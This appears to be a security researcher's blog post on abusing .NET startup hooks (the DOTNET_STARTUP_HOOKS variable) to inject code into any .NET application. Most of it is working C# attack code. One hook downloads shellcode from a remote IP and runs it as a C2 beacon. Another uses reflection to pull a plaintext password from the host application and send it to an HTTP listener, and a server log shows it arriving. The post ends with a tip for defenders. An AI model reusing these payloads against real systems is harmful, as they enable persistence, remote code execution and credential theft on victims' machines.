---
title: .NET Startup Hooks
url: https://rastamouse.me/net-startup-hooks/
source: Rasta Mouse
date: 2023-01-03
fetch_date: 2025-10-04T02:55:58.060355
---

# .NET Startup Hooks

[Rasta Mouse](https://rastamouse.me)

* [Home](https://rastamouse.me/)

02 Jan 2023

3 min read

[c#](/tag/c/)

# .NET Startup Hooks

## tl;dr

Since .NET Core 3, the dotnet runtime has provided a low-level hook that allows injecting managed code that will run before an application’s entry point. This hook makes it possible to effectively backdoor any .NET application on a host (Windows, Linux, and macOS).

You may ask why such a feature exists. It’s used in places like AWS Lambda to inject logging and telemetry capabilities. This allows performance and debugging data to be collected by AWS and sent to CloudWatch etc, without the customer’s codebase having to specifically implement it.

These hooks can be added via the `DOTNET_STARTUP_HOOKS` environment variable.

## StartupHook

The anatomy of a hook itself really couldn’t be simpler. It’s a .NET DLL that has no namespace, a single class called `StartupHook` and a method called `Initialize`. For example:

```
internal class StartupHook
{
    public static void Initialize()
    {
        Console.WriteLine("Hello from injected code!");
    }
}
```

The most important aspect to note about these hooks is that they’re executed synchronously by the same thread that will eventually call `Main`. This means that we should not have expensive or blocking code here (but kicking off new threads is ok).

Consider this very basic .NET Console application:

```
namespace DemoApp;

internal static class Program
{
    public static async Task Main(string[] args)
    {
        while (true)
        {
            var date = DateTime.UtcNow;
            Console.WriteLine($"The time is {date:T}.");

            await Task.Delay(new TimeSpan(0, 0, 10));
        }
    }
}
```

This can be built (in this example to a native Windows EXE) and run, like so:

```
cd C:\Users\Daniel\source\repos\DemoApp\
dotnet publish -c Release -r win-x64

cd .\DemoApp\bin\Release\net6.0\win-x64\publish\

.\DemoApp.exe
The time is 18:28:12.
The time is 18:28:22.
The time is 18:28:32.
```

To inject our hook, create the `DOTNET_STARTUP_HOOKS` environment variable and have it point to our DLL:

```
$env:DOTNET_STARTUP_HOOKS = "C:\DemoStartupHook.dll"
```

Note: you can provide multiple DLLs by separating them with a semi-colon. In which case, each will be executed sequentially.

Execute DemoApp again and we can see our injected code is run.

```
.\DemoApp.exe
Hello from injected code!
The time is 18:42:37.
The time is 18:42:47.
```

This could quite easily be extended to inject shellcode for C2 purposes.

```
using System.Runtime.InteropServices;

internal class StartupHook
{
    public static void Initialize()
    {
        var thread = new Thread(RunBeacon);
        thread.Start();
    }

    private static async void RunBeacon()
    {
        using var client = new HttpClient();
        var shellcode = await client.GetByteArrayAsync("http://172.18.227.121/beacon.bin");

        var hMemory = VirtualAlloc(
            IntPtr.Zero,
            (uint)shellcode.Length,
            0x00001000 | 0x00002000,
            0x04);

        Marshal.Copy(
            shellcode,
            0,
            hMemory,
            shellcode.Length);

        VirtualProtect(
            hMemory,
            (uint)shellcode.Length,
            0x20,
            out _);

        CreateThread(
            IntPtr.Zero,
            0,
            hMemory,
            IntPtr.Zero,
            0,
            IntPtr.Zero);
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll")]
    private static extern bool VirtualProtect(
        IntPtr lpAddress,
        uint dwSize,
        uint  flNewProtect,
        out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId);
}
```

![](https://i0.wp.com/rastamouse.me/wp-content/uploads/2023/01/Screenshot-2023-01-02-195629-1024x184.png?resize=1024%2C184&ssl=1)

Another possibility is to use reflection and call internal methods within the hooked application. Here’s a contrived example where DemoApp has a private method called `GetPassword` which returns a `SecureString`. The actual implementation does not matter – let’s just assume we can’t recover it using static analysis alone.

```
namespace DemoApp;

internal static class Program
{
    public static async Task Main(string[] args)
    {
        while (true)
        {
            var date = DateTime.UtcNow;
            Console.WriteLine($"The time is {date:T}.");

            await Task.Delay(new TimeSpan(0, 0, 10));
        }
    }

    private static SecureString GetPassword()
    {
        // implementation does not matter
    }
}
```

This code will obtain a reference to this method, call it, recover the plaintext password, and then exfiltrate it to ourselves over HTTP.

```
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;

internal class StartupHook
{
    public static async void Initialize()
    {
        var asm = Assembly.GetEntryAssembly();
        var program = asm?.GetType("DemoApp.Program");
        var method = program?.GetMethod("GetPassword", BindingFlags.NonPublic | BindingFlags.Static);

        var password = method?.Invoke(null, Array.Empty<object>());

        if (password is SecureString pass)
        {
            var plaintext = ConvertToString(pass);
            using var client = new HttpClient();
            await client.GetAsync($"http://172.18.227.121:8000?pass={plaintext}");
        }
    }

    private static string ConvertToString(SecureString ss)
    {
        var bstr = Marshal.SecureStringToBSTR(ss);

        try
        {
            return Marshal.PtrToStringBSTR(bstr);
        }
        finally
        {
            Marshal.FreeBSTR(bstr);
        }
    }
}
```

```
daniel@DESKTOP-GB4VHTE:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.18.224.1 - - [02/Jan/2023 21:17:09] "GET /?pass=This%20is%20a%20secure%20password HTTP/1.1" 200 -
```

## Conclusion

.NET startup hooks are powerful and just a little bit scary. [Adam Chester](https://twitter.com/_xpn_) already highlighted the risk of the [COMPlus\_ETWEnabled](https://blog.xpnsec.com/hiding-your-dotnet-complus-etwenabled/) environment variable – if defenders can reliably monitor these across their infrastructure, DOTNET\_STARTUP\_HOOKS is certainly another one to watch out for.

### Published by:

[![Rasta Mouse](https://www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=250&r=x&d=mp)](/author/rasta/ "Rasta Mouse")

Rasta Mouse © 2025

* [Sign up](#/portal/)

[Powered by Ghost](https://ghost.org/)